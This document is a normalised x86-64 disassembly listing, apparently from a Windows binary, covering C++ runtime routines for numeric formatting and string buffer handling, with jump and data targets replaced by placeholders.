mov [ rsp + 0x50 ] di
mov [ rsp + 0x70 ] edi
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x70 ]
lea r8d [ rdi + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
call sub_1400385a4
movzx r11d [ rbx ]
cmp r11b 0x2b
je r-xdata
xor edx edx
lea rcx [ rsp + 0x50 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
mov eax 0x1
cmp r11b 0x2d
mov eax edi
jne r-xdata
xor eax eax
mov ebx eax
cmp [ rdi + 0x8 ] rax
cmove rbx rdi
lea rcx [ rsp + 0x50 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdi [ rsp + 0x68 ]
lea rax [ rbp - 0x10 ]
cmp r8 0x10
cmovae rax rdx
cmp [ rax ] r9b
jle r-xdata
movsxd r13 eax
call sub_14003b85c
mov rcx [ rax ]
movzx eax [ rcx ]
mov [ rsp + 0x54 ] al
mov [ rsp + 0x55 ] 0x65
mov r8 r12
mov edx 0x65
mov rcx rbx
call sub_14003b840
mov rdi rax
movsx edx [ rsp + 0x54 ]
mov r8 r12
mov rcx rbx
call sub_14003b840
mov rbx rax
test rax rax
mov r9d 0x0
cmove r14 r9
lea rcx [ rbp - 0x10 ]
mov rdx [ rbp - 0x10 ]
mov r8 [ rbp + 0x8 ]
cmp r8 0x10
cmovae rcx rdx
cmp [ rcx ] 0x7f
je r-xdata
mov rbx [ rsp + 0x68 ]
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov rsi r9
cmp rsi rax
jbe r-xdata
mov r8 r12
mov r12 [ rsp + 0x68 ]
mov rdx r12
lea rcx [ rbp - 0x38 ]
call sub_14000a5c0
test rdi rdi
jne r-xdata
movsx edx [ rsp + 0x54 ]
mov r8 r12
mov rcx rdi
call sub_14003b840
mov r13 rax
movzx edi [ rsp + 0x50 ]
test rax rax
je r-xdata
cmp eax 0x100
je r-xdata
sub rsi rax
jmp r-xdata
test rbx rbx
jne r-xdata
mov r8b 0x30
mov rdx r14
lea rcx [ rbp - 0x38 ]
call sub_14000a700
jmp r-xdata
mov rbx [ rsp + 0x68 ]
mov r9 [ rsp + 0x68 ]
sub r13 r9
inc r13
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ r13 - 0x1 ]
movzx ecx [ rsp + 0x58 ]
mov [ rsp + 0x28 ] cx
mov [ rsp + 0x20 ] rax
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_14000a900
mov r11 rax
mov rax [ rax ]
mov [ rbx ] rax
mov rax [ r11 + 0x8 ]
mov [ rbx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
mov r8 [ rbp - 0x78 ]
test r8 r8
je r-xdata
test r13 r13
je r-xdata
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
mov eax [ rcx + 0x18 ]
and eax 0x1c0
mov rbx [ rsp + 0x60 ]
cmp eax 0x40
je r-xdata
sub rdi r12
mov r9b 0x30
mov r8 r14
mov rdx rdi
lea rcx [ rbp - 0x38 ]
call sub_1400093c0
mov r8b 0x30
mov rdx rsi
lea rcx [ rbp - 0x38 ]
call sub_14000a700
xor eax eax
mov esi eax
lea rcx [ rbp - 0x38 ]
test rbx rbx
jne r-xdata
mov r13 [ rsp + 0x60 ]
movups xmm0 [ r13 ]
movaps [ rsp + 0x40 ] xmm0
movzx eax [ rsp + 0x58 ]
mov [ rsp + 0x28 ] ax
mov [ rsp + 0x20 ] r12
mov r9 rbx
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_14000a900
mov r11 rax
mov rax [ rax ]
mov [ r13 ] rax
mov rax [ r11 + 0x8 ]
mov [ r13 + 0x8 ] rax
movups xmm0 [ r11 ]
movaps [ rsp + 0x40 ] xmm0
test r14 r14
je r-xdata
sub r13 rbx
inc r13
mov rax [ rsp + 0x60 ]
movups xmm0 [ rax ]
movaps [ rsp + 0x40 ] xmm0
lea rax [ r13 - 0x1 ]
movzx ecx [ rsp + 0x58 ]
mov [ rsp + 0x28 ] cx
mov [ rsp + 0x20 ] rax
mov r9 rbx
lea r8 [ rsp + 0x40 ]
lea rdx [ rbp - 0x50 ]
mov rcx [ rsp + 0x78 ]
call sub_14000a900
mov r11 rax
mov rax [ rax ]
mov rcx [ rsp + 0x60 ]
mov [ rcx ] rax
mov rax [ r11 + 0x8 ]
mov [ rcx + 0x8 ] rax
movups xmm6 [ r11 ]
movaps [ rsp + 0x40 ] xmm6
mov rbx [ rsp + 0x48 ]
test r14 r14
je r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov rcx [ rbp - 0x60 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
movzx r11d ax
test rbx rbx
je r-xdata
mov r15d 0xffff
movups xmm0 [ rbx ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
movups xmm6 [ rbx ]
movaps [ rsp + 0x40 ] xmm6
movzx eax [ rdi ]
mov [ rsp + 0x30 ] al
mov [ rsp + 0x70 ] r9w
mov [ rsp + 0x74 ] r9d
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x74 ]
mov r8d 0x1
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x70 ]
call sub_1400385a4
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
movups [ rbx ] xmm0
xor eax eax
mov esi eax
jmp r-xdata
mov rbx [ rsp + 0x48 ]
sub rbx r12
lea rdx [ rbx + 0x1 ]
mov r9b 0x30
mov r8 [ rbp - 0x80 ]
call sub_1400093c0
mov r9b 0x30
mov r8 rsi
mov rdx rbx
lea rcx [ rbp - 0x38 ]
call sub_1400093c0
xor r14d r14d
mov [ rbp - 0x80 ] r14
mov r8b 0x30
mov rdx rsi
call sub_14000a700
xor r14d r14d
jmp r-xdata
movups [ r13 ] xmm0
mov rax [ rbp - 0x70 ]
xor edi edi
mov [ rax + 0x28 ] rdi
movups xmm0 [ r13 ]
movaps [ rsp + 0x40 ] xmm0
test rsi rsi
je r-xdata
mov rbx [ rsp + 0x48 ]
mov r13d 0xffff
nop [ rax ] eax
movups [ rcx ] xmm6
xor edx edx
mov r14d edx
movaps [ rsp + 0x40 ] xmm6
mov rax [ rbp - 0x70 ]
test [ rax + 0x18 ] 0x4
lea rcx [ r--data ]
lea rax [ r--data ]
cmovne rax rcx
movzx eax [ rax ]
mov [ rsp + 0x30 ] al
mov [ rsp + 0x50 ] dx
mov [ rsp + 0x74 ] edx
mov rax [ rsp + 0x78 ]
add rax 0x10
mov [ rsp + 0x20 ] rax
lea r9 [ rsp + 0x74 ]
lea r8d [ rdx + 0x1 ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x50 ]
call sub_1400385a4
test rbx rbx
je r-xdata
mov r15d 0xffff
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax + rax ] ax
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
movzx r8d [ rsp + 0x70 ]
mov rax [ rcx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
lea rdi [ rbp - 0x38 ]
cmp r8 0x10
cmovae rdi [ rbp - 0x38 ]
mov [ rsp + 0x68 ] rdi
mov rsi r14
xor r9d r9d
jmp r-xdata
nop
mov [ rbp - 0x78 ] r14
lea rdi [ rbp - 0x10 ]
cmp [ rbp + 0x8 ] 0x10
cmovae rdi [ rbp - 0x10 ]
lea rcx [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae rcx [ rbp - 0x38 ]
lea rdx [ rsp + 0x54 ]
call sub_14003b894
mov rsi rax
movzx ecx [ rdi ]
mov r8 [ rbp - 0x20 ]
mov r12 [ rbp - 0x28 ]
cmp cl 0x7f
je r-xdata
mov rbx [ rbp - 0x68 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x20 ] 0x10
jb r-xdata
mov rbx [ rsp + 0x48 ]
nop [ rax ] eax
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x40 ] 0x1
movaps xmm6 [ rsp + 0x40 ]
movzx r8d [ rsp + 0x50 ]
mov rax [ rbx + 0x48 ]
cmp [ rax ] r14
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ rax ] xmm6
mov rbx [ rsp + 0x68 ]
add rbx r13
mov [ rsp + 0x68 ] rbx
sub r12 r13
jmp r-xdata
mov rbx [ rsp + 0x48 ]
mov r15d 0xffff
nop
mov rax [ rbx ]
movzx edx r11w
mov rcx rbx
call [ rax + 0x18 ]
movzx r11d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov r8 [ rbp - 0x78 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rcx ]
movzx edx r8w
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rcx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rbx [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
lea rax [ r12 + r14 ]
add rax [ rbp - 0x80 ]
add rax rsi
mov rcx [ rbp - 0x70 ]
mov rsi [ rcx + 0x28 ]
test rsi rsi
jle r-xdata
movsx rdx cl
mov rax rsi
sub rax r13
cmp rdx rax
jae r-xdata
mov [ rbp - 0x20 ] 0xf
mov [ rbp - 0x28 ] rdi
mov [ rbp - 0x38 ] 0x0
cmp [ rbp + 0x8 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x38 ]
call j_sub_14003ad04
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] rdi
je r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov r13 [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov rax [ rbx ]
movzx edx r8w
mov rcx rbx
call [ rax + 0x18 ]
movzx r8d ax
mov rax [ rbx + 0x60 ]
cmp [ rax ] r14d
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rcx [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov r8 r12
mov edx 0x65
mov rcx rbx
call sub_14003b840
mov r13 rax
test rax rax
je r-xdata
mov [ rsp + 0x40 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
movaps [ rsp + 0x40 ] xmm6
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r11w
jmp r-xdata
dec r8
mov [ rbp - 0x78 ] r8
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
test rbx rbx
je r-xdata
jmp r-xdata
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ rbx ] xmm6
inc rdi
mov [ rsp + 0x68 ] rdi
dec r12
dec [ rax ]
mov rcx [ rcx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
sub rsi rdx
cmp r12 rsi
jb r-xdata
mov rax rbx
mov rcx [ rbp + 0x18 ]
xor rcx rsp
call sub_14003a6a0
movaps xmm6 [ rsp + 0x120 ]
add rsp 0x138
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x10 ]
call j_sub_14003ad04
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x40 ]
mov rax [ rbx ]
movzx edx r15w
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] edi
jle r-xdata
dec r14
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
mov rax [ rsp + 0x60 ]
movups [ rax ] xmm6
mov rbx [ rsp + 0x68 ]
add rbx r13
sub r12 r13
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r8w
jmp r-xdata
dec r14
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
test rbx rbx
je r-xdata
movaps xmm6 [ rsp + 0x40 ]
movzx r15d [ rsp + 0x5a ]
mov rax [ rsp + 0x60 ]
mov rax [ rbx ]
movzx edx di
mov rcx rbx
call [ rax + 0x18 ]
mov r8 [ rbp - 0x80 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
mov eax 0xffff
cmp ax r11w
jne r-xdata
cmp r15w ax
jne r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
mov eax 0xffff
cmp ax r8w
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
lea rcx [ r--data ]
call sub_140037948
or rax 0xffffffffffffffff
sub rax r12
cmp rax 0x1
jbe r-xdata
dec rsi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] r15w
movzx eax r15w
jmp r-xdata
cmp r13w ax
jne r-xdata
mov eax 0xffff
cmp ax r8w
jne r-xdata
cmp r15w ax
jne r-xdata
dec r8
mov [ rbp - 0x80 ] r8
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] di
movzx eax di
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
lea rcx [ r--data ]
call sub_1400378ec
lea rbx [ r12 + 0x1 ]
cmp rbx 0xfffffffffffffffe
ja r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
cmp r15w ax
jne r-xdata
lea rcx [ r--data ]
call sub_1400378ec
cmp r8 rbx
jae r-xdata
test rbx rbx
jne r-xdata
mov r8 r12
mov rdx rbx
lea rcx [ rbp - 0x38 ]
call sub_1400061b0
jmp r-xdata
setne al
test al al
je r-xdata
mov [ rbp - 0x28 ] r14
lea rax [ rbp - 0x38 ]
cmp r8 0x10
cmovae rax [ rbp - 0x38 ]
mov [ rax ] bl
mov r12 [ rbp - 0x28 ]
mov r8 [ rbp - 0x20 ]
test rbx rbx
lea rax [ rdi + 0x1 ]
cmp [ rax ] 0x0
cmovg rdi rax
movzx ecx [ rdi ]
cmp cl 0x7f
jne r-xdata
lea rdx [ rbp - 0x38 ]
mov rax [ rbp - 0x38 ]
cmp r8 0x10
cmovae rdx rax
lea rcx [ rbp - 0x38 ]
cmovae rcx rax
sub r12 rsi
add rdx rsi
lea rcx [ rcx + rsi + 0x1 ]
mov r8 r12
call sub_14003a8c0
lea r11 [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae r11 [ rbp - 0x38 ]
mov [ r11 + rsi ] 0x0
mov [ rbp - 0x28 ] rbx
lea rax [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x10
cmovae rax [ rbp - 0x38 ]
mov [ rax + rbx ] 0x0
mov r8 [ rbp - 0x20 ]
mov r12 [ rbp - 0x28 ]
test cl cl
jle r-xdata
jmp r-xdata
sub_14000a060
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x7 ]
sub rsp 0xc8
mov [ rbp - 0x49 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x9 ] rax
mov [ rbp - 0x79 ] r9
mov [ rsp + 0x30 ] r8
mov [ rbp - 0x51 ] rdx
mov [ rbp - 0x61 ] rcx
movzx esi [ rbp + 0x6f ]
mov r15 [ rbp + 0x77 ]
mov r14 [ rbp + 0x7f ]
lea rdx [ rbp - 0x59 ]
mov rcx r9
call sub_140003240
nop
mov rcx rax
call sub_14000b210
mov r13 rax
mov [ rbp - 0x71 ] rax
mov r12d 0x1
mov rdi [ rbp - 0x59 ]
test rdi rdi
je r-xdata
lea rdx [ rbp - 0x31 ]
mov rcx r13
call sub_14002b150
nop
movzx eax [ r15 ]
cmp al 0x2b
je r-xdata
xor edx edx
lea rcx [ rsp + 0x40 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
movsxd r13 r12d
lea rax [ rbp - 0x31 ]
mov rcx [ rbp - 0x31 ]
mov rdx [ rbp - 0x19 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x7f
je r-xdata
cmp al 0x2d
je r-xdata
xor ebx ebx
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x40 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rbx [ rbp - 0x79 ]
mov rdi [ rbx + 0x28 ]
test rdi rdi
jle r-xdata
lea rax [ rbp - 0x31 ]
cmp rdx 0x10
cmovae rax rcx
cmp [ rax ] 0x0
jle r-xdata
cmp al 0x30
jne r-xdata
mov rax [ rbx ]
mov edx r12d
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
xor edi edi
cmp rdi r14
jbe r-xdata
lea r12 [ rbp - 0x31 ]
cmp rdx 0x10
cmovae r12 rcx
mov rdi r14
movzx eax [ r12 ]
cmp al 0x7f
je r-xdata
xor r12d r12d
movzx eax [ r15 + 0x1 ]
cmp al 0x78
je r-xdata
mov r13d 0xffff
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
cmp eax 0x100
je r-xdata
sub rdi r14
jmp r-xdata
test al al
jle r-xdata
mov r12d 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov rbx [ rbp - 0x51 ]
movups [ rbx ] xmm0
cmp [ rbp - 0x19 ] 0x10
jb r-xdata
mov rbx [ rbp - 0x69 ]
mov [ rsp + 0x20 ] r13
mov r9 r15
lea r8 [ rsp + 0x30 ]
lea rdx [ rbp - 0x41 ]
mov rcx [ rbp - 0x61 ]
call sub_14000a800
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
add r15 r13
sub r14 r13
movups xmm0 [ r11 ]
movaps [ rsp + 0x30 ] xmm0
mov r13d 0xffff
test rdi rdi
je r-xdata
test rdi rdi
je r-xdata
mov eax [ rbx + 0x18 ]
and eax 0x1c0
mov r12 [ rsp + 0x30 ]
cmp eax 0x40
je r-xdata
movsx rcx al
mov rax rdi
sub rax r13
cmp rcx rax
jae r-xdata
mov rax rbx
mov rcx [ rbp - 0x9 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0xc8
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
mov rcx [ rbp - 0x31 ]
call j_sub_14003ad04
mov [ rbp - 0x71 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
nop
sub rdi rcx
mov rdx r14
sub rdx rdi
inc rdx
lea rbx [ r15 + rdi ]
lea rcx [ r15 + rdi + 0x1 ]
mov r9 rdx
mov r8 rbx
call sub_14003b7c8
mov [ rbx ] 0x0
inc r14
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0x0
cmovg r12 rax
movzx eax [ r12 ]
cmp al 0x7f
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rbp - 0x71 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
mov rcx [ rbp - 0x71 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rsp + 0x28 ] ax
mov [ rsp + 0x20 ] r14
mov r9 r15
lea r8 [ rsp + 0x30 ]
lea rdx [ rbp - 0x41 ]
mov rcx [ rbp - 0x61 ]
call sub_14000a900
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
mov [ rbx + 0x28 ] 0x0
movups xmm0 [ r12 ]
movaps [ rbp - 0x71 ] xmm0
test rdi rdi
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rbx [ rbp - 0x79 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
mov rbx [ rbp - 0x79 ]
mov rax [ rbx ]
movzx edx si
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp r13w ax
jne r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x2 ]
mov [ rcx ] rax
mov [ rdx ] si
movzx eax si
jmp r-xdata
cmp r13w ax
jne r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_14000a470
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x10 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] al
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140005c90
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14000a4c0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x20 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] ax
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140001ea0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14000a510
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdx [ rcx + 0x28 ]
xor eax eax
or rcx 0xffffffffffffffff
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rax
mov rdi rdx
mov [ rbx ] ax
mov [ rsp + 0x30 ] eax
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_140001ea0
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_14000a560
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov rdi rcx
mov ebx edx
mov [ rcx ] rax
mov rcx [ rcx + 0x10 ]
call j_sub_14003ad04#2
mov rcx [ rdi + 0x20 ]
call j_sub_14003ad04#2
mov rcx [ rdi + 0x28 ]
call j_sub_14003ad04#2
lea r11 [ r--data ]
mov [ rdi ] r11
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_14000a5c0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
mov rbp r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax rbp
ja r-xdata
mov r9 [ rcx + 0x18 ]
cmp r9 0x10
jb r-xdata
mov [ rsp + 0x30 ] rdi
test rbp rbp
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rbp ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
cmp r9 0x10
jb r-xdata
cmp rdx rax
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rcx [ rbx + 0x10 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_1400061b0
test rdi rdi
je r-xdata
cmp r9 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov [ rbx ] 0x0
jmp r-xdata
mov rax [ rbx ]
mov [ rax ] dil
jmp r-xdata
sub rsi rax
mov r9 r8
mov rdx rbx
mov r8 rsi
mov rcx rbx
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rsi
jmp sub_14000aaf0
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
add rcx [ rbx + 0x10 ]
mov r8 rbp
mov rdx rsi
call sub_14003a8c0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_14000a700
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
sub rsp 0x20
or rax 0xffffffffffffffff
movzx ebp r8b
mov r8 [ rcx + 0x10 ]
sub rax r8
mov rsi rdx
mov rbx rcx
cmp rax rdx
ja r-xdata
mov [ rsp + 0x30 ] rdi
test rdx rdx
je r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rdi [ rsp + 0x30 ]
mov rbp [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rdi [ r8 + rdx ]
cmp rdi 0xfffffffffffffffe
jbe r-xdata
